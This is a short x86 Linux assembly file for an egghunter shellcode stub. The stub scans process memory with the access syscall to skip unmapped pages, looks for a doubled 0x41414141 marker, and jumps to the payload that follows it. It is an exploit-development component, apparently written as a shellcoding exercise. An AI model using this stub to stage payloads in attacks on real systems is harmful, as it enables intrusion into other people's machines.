; access_egghunter.asm
; Author: German Namestnikov
 
global _start
 
section .text
 
_start:

xor edx, edx

page_alignment:
    or dx,0xfff

egg_hunting:
    inc edx
    lea ebx, [edx + 0x04]
    
    push dword 0x21
    pop eax

    int 0x80
    
    cmp al, 0xf2
    jz page_alignment

    mov eax, 0x41414141

    mov edi, edx

    scasd

    jnz egg_hunting
    scasd

    jnz egg_hunting
    jmp edi
